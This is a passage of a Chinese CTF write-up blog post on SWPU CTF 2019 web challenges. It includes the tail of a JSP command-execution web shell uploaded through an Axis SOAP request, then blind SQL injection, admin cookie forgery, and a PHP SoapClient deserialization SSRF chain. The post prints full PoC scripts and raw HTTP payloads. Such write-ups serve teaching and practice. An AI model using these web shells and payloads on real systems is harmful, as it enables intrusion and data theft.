(request.getParameter(&quot;c&quot;) != null) &#123; Process p = Runtime.getRuntime().exec(request.getParameter(&quot;c&quot;)); DataInputStream dis = new DataInputStream(p.getInputStream()); String disr = dis.readLine(); while ( disr != null ) &#123; out.println(disr); disr = dis.readLine(); &#125;; p.destroy(); &#125;%&gt;</span><br><span class="line">]]&gt;</span><br><span class="line">            &lt;/api:in0&gt;</span><br><span class="line">        &lt;/api:main&gt;</span><br><span class="line">  &lt;/soapenv:Body&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/swpuctf/42.png" alt=""></p>
<p>虽然响应500，但是此时已经成功写入了，访问/axis/somnus.jsp</p>
<p><img src="../../../../img/swpuctf/43.png" alt=""></p>
<p>最后执行命令读取flag</p>
<p><img src="../../../../img/swpuctf/44.png" alt=""></p>
<h3 id="出题人不知道"><a href="#出题人不知道" class="headerlink" title="出题人不知道"></a>出题人不知道</h3><p>题目说明给了一个<strong>wsdl.php</strong></p>
<p><img src="../../../../img/swpuctf/45.png" alt=""></p>
<p>我们可以看到一些wsdl的接口服务</p>
<p>访问index.php：</p>
<p><img src="../../../../img/swpuctf/46.png" alt=""></p>
<p>一个登陆界面</p>
<p>发现index.php有个参数<code>method</code>，后面可以跟上wsdl中接口的名称，但是除了访问index和login，其他都会跳转到login，所以我们必须先登陆</p>
<p>抓包发现有回显sql语句：</p>
<p><img src="../../../../img/swpuctf/47.png" alt=""></p>
<p>测试发现语句的逻辑是：查询有结果，并且passwd字段与输入的密码匹配，则登陆成功</p>
<p>fuzz下，过滤了：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">union select () regexp like</span><br></pre></td></tr></table></figure>

<p>无报错，无联合查询，无堆叠。那么只能盲注，但是括号的过滤，让我们无法使用一些字符串截取的函数，并且<strong>regexp</strong>和<strong>like</strong>也被过滤了</p>
<p>但是我们还是可以通过判断符号，例如<code>&gt;</code>来盲注判断，逻辑如下：</p>
<p><img src="../../../../img/swpuctf/48.png" alt=""></p>
<p>比如上图，我们可以构造如下盲注条件：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&apos; or passwd &gt; &apos;3&apos; =&gt; Wrong password</span><br><span class="line">                                                      =&gt; passwd第一位为&apos;3&apos;</span><br><span class="line">&apos; or passwd &gt; &apos;4&apos; =&gt; wrong  username or password</span><br></pre></td></tr></table></figure>

<p>然后我们直接用burp intruder进行盲注</p>
<p><img src="../../../../img/swpuctf/49.png" alt=""></p>
<p>之后再对密码<strong>333333332</strong>的下一位爆破时，发现<code>[a-zA-Z0-9]</code>全都返回<code>Wrong password</code></p>
<p><img src="../../../../img/swpuctf/50.png" alt=""></p>
<p>把2这为替换为3，对下一位爆破</p>
<p><img src="../../../../img/swpuctf/51.png" alt=""></p>
<p>全都返回*<em>wrong  username or password *</em>则说明<code>2</code>这位代表最后一位，且最后一位正确值应该为3</p>
<p>所以密码<code>passwd=333333333</code></p>
<p>同样方法再对用户名<code>username</code>盲注，得到<code>username=xiaoc</code></p>
<p>登陆</p>
<p><img src="../../../../img/swpuctf/52.png" alt=""></p>
<p>然后开始各个接口路由</p>
<p><code>?method=Get_flag</code></p>
<p><img src="../../../../img/swpuctf/55.png" alt=""></p>
<p>告诉我们需要<code>admin</code>身份，并且<code>127.0.0.1</code>本地访问才能getflag</p>
<p>很容易想到两个点：（1）cookie身份伪造（2）ssrf</p>
<p><code>?method=hint</code>：</p>
<p><img src="../../../../img/swpuctf/53.png" alt=""></p>
<p>提示我们了：index.php Service.php interface.php se.php 这些文件</p>
<p>想到了刚才看的有个读取文件的服务：<code>?method=File_read</code></p>
<p><img src="../../../../img/swpuctf/54.png" alt=""></p>
<p>fuzz一下参数，发现POST参数<code>filename</code>能读到文件</p>
<p><img src="../../../../img/swpuctf/56.png" alt=""></p>
<p>那么依次读取hint中的那几个文件，除了<strong>Service.php</strong>不能直接读取，其他都可正常读取</p>
<p>得到源码后开始审计，<strong>se.php</strong>中有很明显的反序列化，可以构造POP链，POP链的终点：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dd</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $name;</span><br><span class="line">        <span class="keyword">public</span> $flag;</span><br><span class="line">        <span class="keyword">public</span> $b;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getflag</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                session_start(); </span><br><span class="line">                var_dump($_SESSION);</span><br><span class="line">                $a = <span class="keyword">array</span>(reset($_SESSION),<span class="keyword">$this</span>-&gt;flag);</span><br><span class="line">                <span class="keyword">echo</span> call_user_func(<span class="keyword">$this</span>-&gt;b,$a);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>并且开头：<code>ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);</code></p>
<p>很眼熟，通过session反序列化<code>SoapClient</code>，<code>call_user_func</code>调用<code>SoapClient</code>进行<strong>ssrf</strong>，具体可以参考lctf的bestphp’s revenge 这道题</p>
<p>首先解决身份伪造，index.php开头<code>include(&#39;encode.php&#39;);</code>，读取<strong>encode.php</strong>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">en_crypt</span><span class="params">($content,$key)</span></span>&#123;</span><br><span class="line">    $key    =    md5($key);</span><br><span class="line">    $h      =    <span class="number">0</span>;</span><br><span class="line">    $length    =    strlen($content);</span><br><span class="line">    $swpuctf      =    strlen($key);</span><br><span class="line">    $varch   =    <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">for</span> ($j = <span class="number">0</span>; $j &lt; $length; $j++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ($h == $swpuctf)</span><br><span class="line">        &#123;</span><br><span class="line">            $h = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $varch .= $key&#123;$h&#125;;</span><br><span class="line">        </span><br><span class="line">        $h++;</span><br><span class="line">    &#125;</span><br><span class="line">    $swpu  =  <span class="string">''</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> ($j = <span class="number">0</span>; $j &lt; $length; $j++)</span><br><span class="line">    &#123;</span><br><span class="line">        $swpu .= chr(ord($content&#123;$j&#125;) + (ord($varch&#123;$j&#125;)) % <span class="number">256</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> base64_encode($swpu);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>给了我们cookie的加密方法，且key在wsdl的文件名中可以找到：<strong>keyaaaaaaaasdfsaf.txt</strong></p>
<p>访问得到key：<strong>flag{this_is_false_flag}</strong></p>
<p>已知<code>key</code>和密文，自己写一个解密脚本：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">de_crypt</span><span class="params">($swpu,$key)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $key = md5($key);</span><br><span class="line">    $swpu = base64_decode($swpu);</span><br><span class="line">    $length = strlen($swpu);</span><br><span class="line">    $h = <span class="number">0</span>;</span><br><span class="line">    $swpuctf = strlen($key);</span><br><span class="line"></span><br><span class="line">    $varch = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">for</span> ($j = <span class="number">0</span>; $j &lt; $length; $j++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> ($h == $swpuctf)</span><br><span class="line">        &#123;</span><br><span class="line">            $h = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $varch .= $key&#123;$h&#125;;</span><br><span class="line"></span><br><span class="line">        $h++;</span><br><span class="line">    &#125;</span><br><span class="line">    $content = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">for</span>($j = <span class="number">0</span>;$j &lt; $length;$j++)</span><br><span class="line">    &#123;</span><br><span class="line">        $content .= chr(ord($swpu&#123;$j&#125;) - ord($varch&#123;$j&#125;));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $content;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$key = <span class="string">"flag&#123;this_is_false_flag&#125;"</span>;</span><br><span class="line"><span class="keyword">echo</span> de_crypt(<span class="string">"3J6Roahxaw=="</span>,$key);</span><br></pre></td></tr></table></figure>

<p>运行得到明文：<strong>xiaoC:3</strong></p>
<p>那么我们修改明文：<strong>admin:1</strong>进行加密，得到密文：<strong>xZmdm9NxaQ==</strong></p>
<p>替换cookie进行验证：</p>
<p><img src="../../../../img/swpuctf/57.png" alt=""></p>
<p>成功伪造admin</p>
<p>接下来ssrf，首先考虑如何修改session，通过php的<code>session.upload_progess</code>来填充session数据</p>
<p>具体可以参考：<a href="https://www.freebuf.com/vuls/202819.html" target="_blank" rel="noopener">https://www.freebuf.com/vuls/202819.html</a> </p>
<p>我们首先构造<code>SoapClient</code>的序列化payload：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">$target = <span class="string">'http://127.0.0.1/interface.php'</span>; </span><br><span class="line">$headers = <span class="keyword">array</span>(<span class="string">'X-Forwarded-For:127.0.0.1'</span>, <span class="string">'Cookie:user=xZmdm9NxaQ=='</span> );</span><br><span class="line">$b = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>,<span class="keyword">array</span>(<span class="string">'location'</span> =&gt; $target,<span class="string">'user_agent'</span>=&gt;<span class="string">'wupco^^'</span>.join(<span class="string">'^^'</span>,$headers),<span class="string">'uri'</span> =&gt; <span class="string">"aaab"</span>)); </span><br><span class="line">$aaa = serialize($b); </span><br><span class="line">$aaa = str_replace(<span class="string">'^^'</span>,<span class="string">"\r\n"</span>,$aaa); </span><br><span class="line">$aaa = str_replace(<span class="string">'&amp;'</span>,<span class="string">'&amp;'</span>,$aaa); </span><br><span class="line"><span class="keyword">echo</span> $aaa; </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>这里的<code>laction</code>设置的是<code>interface.php</code>，如果是<code>index.php?method=get_flag</code>是获取不到信息的。实际上。我们能返回到信息，是因为这边已经实例化了<strong>SoapServer</strong>类的原因</p>
<p>我们可以首先看看<code>interface.php</code>的代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>   </span><br><span class="line">    <span class="keyword">include</span>(<span class="string">'Service.php'</span>);</span><br><span class="line">    $ser = <span class="keyword">new</span> SoapServer(<span class="string">'Service.wsdl'</span>,<span class="keyword">array</span>(<span class="string">'soap_version'</span>=&gt;SOAP_1_2));</span><br><span class="line">    $ser-&gt;setClass(<span class="string">'Service'</span>);</span><br><span class="line">    $ser-&gt;handle();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>使用了<code>SoapServer</code>生成了<strong>wsdl</strong>文档，传入类<code>Service</code>来启用接口服务，关于接口服务，测试代码如下：</p>
<p>服务器端server.php</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Service</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">Get_flag</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="string">"flag&#123;xxx&#125;"</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ser = <span class="keyword">new</span> SoapServer(<span class="keyword">null</span>,<span class="keyword">array</span>(<span class="string">'uri'</span>=&gt;<span class="string">'sampleA'</span>));</span><br><span class="line">$ser-&gt;setClass(<span class="string">'Service'</span>);</span><br><span class="line">$ser-&gt;handle();</span><br><span class="line"></span><br><span class="line"> <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>客户端client.php：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$client = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>, <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">'location'</span>=&gt;<span class="string">'http://127.0.0.1/soap/server.php'</span>,</span><br><span class="line">        <span class="string">'uri'</span>=&gt;<span class="string">'sampleA'</span></span><br><span class="line">        ));</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $client-&gt;Get_flag(); <span class="comment">//flag&#123;xxx&#125;</span></span><br></pre></td></tr></table></figure>

<p>当客户端实例化了<code>SoapClient</code>后，就可以调用到<code>Service</code>类中的任意方法，并通过<code>return</code>得到回显</p>
<p>而如果我们仅仅是通过<code>SoapClient</code>调用不存在的方法触发ssrf，是不会得到回显的，可以本地测一下就知道了，而这里<code>Service</code>类的<code>get_flag</code>方法显然是需要通过回显来得到flag。这就需要利用<code>SoapServer</code></p>
<p>所以我们通过反序列化<code>SoapClient</code>类，<code>location</code>指向<code>interface.php</code>即服务端，因为服务端的<code>setClass</code>为<code>Service</code>类，而<code>Get_flag</code>方法在<code>Service</code>类中，最后我们通过<code>call_user_func</code>调用<code>SoapClient</code>类的<code>Get_flag</code>方法即调用了<code>Service</code>类的<code>Get_flag</code>方法</p>
<p>构造如下包：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php HTTP/1.1</span><br><span class="line">Host: 132.232.75.90</span><br><span class="line">Content-Length: 526</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://192.168.3.19</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryKzdeUKO2QjByVOSs</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3</span><br><span class="line">Referer: http://192.168.3.19/upload/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=test2</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryKzdeUKO2QjByVOSs</span><br><span class="line">Content-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line"></span><br><span class="line">|O:10:&quot;SoapClient&quot;:5:&#123;s:3:&quot;uri&quot;;s:4:&quot;aaab&quot;;s:8:&quot;location&quot;;s:30:&quot;http://127.0.0.1/interface.php&quot;;s:15:&quot;_stream_context&quot;;i:0;s:11:&quot;_user_agent&quot;;s:58:&quot;wupco</span><br><span class="line">X-Forwarded-For:127.0.0.1</span><br><span class="line">Cookie:user=xZmdm9NxaQ==&quot;;s:13:&quot;_soap_version&quot;;i:1;&#125;</span><br><span class="line">------WebKitFormBoundaryKzdeUKO2QjByVOSs</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.txt&quot;</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryKzdeUKO2QjByVOSs--</span><br></pre></td></tr></table></figure>

<p><img src="../../../../img/swpuctf/58.png" alt=""></p>
<p>此时session_id为<code>test2</code>已经存入了序列化后的<code>SoapClient</code>类</p>
<p>接下来，编写POP链的POC：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">bb</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mod1;</span><br><span class="line">    <span class="keyword">public</span> $mod2;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1 = <span class="keyword">new</span> aa();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">aa</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mod1;</span><br><span class="line">    <span class="keyword">public</span> $mod2 = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod2[<span class="string">'test2'</span>] = <span class="keyword">new</span> cc();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">cc</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $mod1;</span><br><span class="line">    <span class="keyword">public</span> $mod2;</span><br><span class="line">    <span class="keyword">public</span> $mod3;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod3 = <span class="keyword">new</span> ee();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod2 = &amp;$_SESSION[<span class="string">'a'</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;mod1 = <span class="string">"fuck"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ee</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $str1;</span><br><span class="line">    <span class="keyword">public</span> $str2;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str1 = <span class="keyword">new</span> dd();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;str2 = <span class="string">"getflag"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dd</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $flag;</span><br><span class="line">    <span class="keyword">public</span> $b;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="string">"call_user_func"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;flag =  <span class="string">"Get_flag"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$b = <span class="keyword">new</span> bb();</span><br><span class="line"><span class="keyword">echo</span> serialize($b);</span><br></pre></td></tr></table></figure>

<p>最后访问se.php，将sessionid替换为<strong>test2</strong>，并传入POC触发反序列化<code>SoapClient</code>进行ssrf，获得flag</p>
<p><img src="../../../../img/swpuctf/59.png" alt=""></p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined" target="_blank" rel="noopener">Somnus</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://nikoeurus.github.io/2019/12/09/SWPU-ctf/">https://nikoeurus.github.io/2019/12/09/SWPU-ctf/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://Nikoeurus.github.io">Somnus's blog</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/SWPU-ctf/">SWPU ctf</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2019/12/11/2019%E5%AE%89%E6%B4%B5%E6%9D%AF%E7%BA%BF%E4%B8%8B%E8%B5%9Bawd-Web%E9%A2%98%E8%A7%A3/"><i class="fa fa-chevron-left">  </i><span>2019 安洵杯线下赛awd-Web题解WriteUp</span></a></div><div class="next-post pull-right"><a href="/2019/12/03/ThinkPHP%206.0.x%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96(%E4%BA%8C)/"><span>ThinkPHP 6.0.x反序列化(二)</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="vcomment"></div><script src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js"></script><script>var notify = 'true' == true ? true : false;
var verify = 'false' == true ? true : false;
var GUEST_INFO = ['nick','mail','link'];
var guest_info = 'nick,mail,link'.split(',').filter(function(item){
  return GUEST_INFO.indexOf(item) > -1
});
guest_info = guest_info.length == 0 ? GUEST_INFO :guest_info;
window.valine = new Valine({
  el:'#vcomment',
  notify:notify,
  verify:verify,
  appId:'piszMlsB7MhecwDRlz0IFCop-gzGzoHsz',
  appKey:'PHmvwpbyTPCcD3D52L1CoTlp',
  placeholder:'Just go go',
  avatar:'wavatar',
  guest_info:guest_info,
  pageSize:'10',
  lang: 'zh-cn'
})</script></div></div><footer class="footer-bg" style="background-image: url(/img/background.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2018 - 2019 By Somnus</div><div class="framework-info"><span>驱动 - </span><a href="http://hexo.io" target="_blank" rel="noopener"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 - </span><a href="https://github.com/Molunerfinn/hexo-theme-melody" target="_blank" rel="noopener"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.6.1"></script><script src="/js/fancybox.js?version=1.6.1"></script><script src="/js/sidebar.js?version=1.6.1"></script><script src="/js/copy.js?version=1.6.1"></script><script src="/js/fireworks.js?version=1.6.1"></script><script src="/js/transition.js?version=1.6.1"></script><script src="/js/scroll.js?version=1.6.1"></script><script src="/js/head.js?version=1.6.1"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script></body></html>